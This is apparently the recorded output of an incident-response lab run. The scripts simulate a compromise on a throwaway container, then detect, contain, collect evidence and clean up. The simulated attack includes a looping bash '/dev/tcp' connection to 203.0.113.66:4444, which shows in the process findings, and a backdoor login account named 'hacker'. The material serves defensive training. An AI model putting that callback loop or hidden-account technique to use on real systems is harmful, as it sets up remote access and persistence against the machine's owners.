@@ -1,0 +1,135 @@
+# Real run of the lab scripts in a disposable Ubuntu 24.04 cloud container, 2026-11-27 (UTC).
+# Only the lines that describe the sandbox's own management processes and
+# ports are redacted; everything else is the scripts' output as printed.
+# Differences from a normal machine: there is no auth.log or journal, the
+# container's init does not reap processes (the killed loop shows as a
+# zombie), and outbound connections are refused at once, so no SYN-SENT
+# socket was in flight when the triage ran.
+
+$ sudo ./simulate_compromise.sh --apply
+
+== Simulated compromise (applying) ==
+  [ OK ] suspicious process started: PID 8999, output to /tmp/.hidden_log
+  + useradd -M -s /bin/bash -c IR-LAB simulated account hacker
+  [ OK ] account hacker created with a random password (status: P)
+         suspicious IP for this case: 203.0.113.66 (port 4444)
+
+Case folder: /var/lib/ir-lab
+Next: sudo ./detect_iocs.sh
+
+$ sudo ./detect_iocs.sh -k ubuntu -x '<cloud sandbox agents>'
+
+== Processes ==
+  [FAIL] [process] PID 8999 (root, parent 1) writes its output to hidden file /tmp/.hidden_log: bash -c while true; do timeout 120 bash -c 'exec 3<>/dev/tcp/203.0.113.66/4444' 2>/dev/nul
+  [FAIL] [process] PID 8999 (root) has the watchlist IP 203.0.113.66 in its command line
+         simulated PID 8999:  8999     1       00:40 bash -c while true; do timeout 120 bash -c 'exec 3<>/dev/tcp/203.0.113.66/4444' 2>/dev/null; sleep 30; done
+  Top CPU:
+      PID USER     %CPU %MEM     ELAPSED CMD
+      (cloud sandbox processes redacted)
+
+== Network ==
+  Listening TCP/UDP ports:
+    (cloud sandbox agent ports redacted)
+
+== Accounts ==
+  [FAIL] [account] unknown login account with a usable password: hacker (UID 30033, shell /bin/bash, password status P), no home folder
+         hacker carries the lab's simulation marker
+
+== Authentication logs ==
+  [WARN] no authentication log found (no /var/log/auth.log, nothing in the journal)
+
+== Files ==
+  [WARN] [file] hidden file in a temp folder: /tmp/.hidden_log (root 0 bytes, modified 2026-11-27 01:01:18)
+         [file] script changed in the last 1d: /etc/profile.d/ccr-agent-proxy-ca.sh
+         SUID programs on the root filesystem: 11 (package-owned ones are not listed)
+
+== Persistence ==
+
+== Summary ==
+  HIGH: 3   MEDIUM: 1   LOW: 1
+  Findings saved to /var/lib/ir-lab/findings.tsv
+
+$ sudo ./contain.sh --apply
+
+== Containment (applying) ==
+Step 1: snapshot PID 8999 before it is killed
+  [ OK ] saved to /var/lib/ir-lab/process_8999_20261127_010215
+Step 2: block 203.0.113.66 in both directions
+  + iptables -I OUTPUT 1 -d 203.0.113.66/32 -m comment --comment ir-lab -j DROP
+  + iptables -I INPUT 1 -s 203.0.113.66/32 -m comment --comment ir-lab -j DROP
+  [ OK ] test connection to 203.0.113.66:4444 was dropped (OUTPUT rule packets 0 -> 3)
+Step 3: stop and kill PID 8999 and every process below it
+  + kill -STOP 8999
+  + kill -KILL 8999 9040
+  [ OK ] PID 8999 is no longer running
+Step 4: disable account hacker
+  + usermod -L hacker
+  + passwd -l hacker
+passwd: password changed.
+  + chage -E 0 hacker
+  + usermod -s /usr/sbin/nologin hacker
+         no processes owned by hacker
+  [ OK ] passwd -S hacker shows L (locked)
+
+== Verification ==
+  # Containment verification, 2026-11-27 01:02:18 +0000, host vm
+  
+  $ ps -p 8999 -o pid,cmd
+  PID 8999 is a zombie: dead, waiting for its parent to collect it
+  Process 8999 is no longer running
+  
+  $ iptables -L -n -v | grep 203.0.113.66
+      0     0 DROP       0    --  *      *       203.0.113.66         0.0.0.0/0            /* ir-lab */
+      3   180 DROP       0    --  *      *       0.0.0.0/0            203.0.113.66         /* ir-lab */
+  
+  $ passwd -S hacker
+  hacker L 2026-11-27 0 99999 7 -1
+  
+  $ chage -l hacker | grep 'Account expires'
+  Account expires						: Jan 01, 1970
+  
+  $ who
+
+$ sudo ./collect_evidence.sh
+Starting forensic data collection...
+  [timedatectl.txt] exit 1: timedatectl
+  [systemd_units.txt] exit 1: systemctl list-units --type=service --all --no-pager
+Collection complete: /var/lib/ir-lab/evidence/ir_collection_vm_20261127_010223.tar.gz
+  files: 34   commands that failed: 2 (see errors.txt inside)
+  sha256: 993feef0c5aba60f0a9d2f18e4e410099e6519e24121d65cd08a66679eeb86da
+  recorded in /var/lib/ir-lab/evidence_hashes.txt and chain_of_custody.txt
+
+$ sudo ./collect_evidence.sh --verify /var/lib/ir-lab/evidence/ir_collection_vm_20261127_010223.tar.gz
+  [ OK ] archive hash matches the recorded value: 993feef0c5aba60f0a9d2f18e4e410099e6519e24121d65cd08a66679eeb86da
+
+$ sudo ./build_report.sh --analyst "Irshad Ali"
+Report written: /var/lib/ir-lab/reports/incident_report_20261127_010224.md
+
+$ sudo ./cleanup_lab.sh
+
+== Cleanup (dry run) ==
+  would run: userdel hacker
+  would run: iptables -D OUTPUT -d 203.0.113.66/32 -m comment --comment ir-lab -j DROP
+  would run: iptables -D INPUT -s 203.0.113.66/32 -m comment --comment ir-lab -j DROP
+  would run: rm -f -- /tmp/.hidden_log
+  would run: rm -f -- /tmp/simulated_pid.txt
+  would run: rm -f -- /var/lib/ir-lab/simulated.pid
+         case folder kept: /var/lib/ir-lab (use --remove-evidence only after the report is approved)
+
+Dry run: nothing was changed. Re-run with --apply.
+
+$ sudo ./cleanup_lab.sh --apply
+
+== Cleanup (applying) ==
+  + userdel hacker
+  + iptables -D OUTPUT -d 203.0.113.66/32 -m comment --comment ir-lab -j DROP
+  + iptables -D INPUT -s 203.0.113.66/32 -m comment --comment ir-lab -j DROP
+  + rm -f -- /tmp/.hidden_log
+  + rm -f -- /tmp/simulated_pid.txt
+  + rm -f -- /var/lib/ir-lab/simulated.pid
+         case folder kept: /var/lib/ir-lab (use --remove-evidence only after the report is approved)
+
+== Verification ==
+  [ OK ] account hacker removed
+  [ OK ] no rules for 203.0.113.66 (other rules untouched)
+
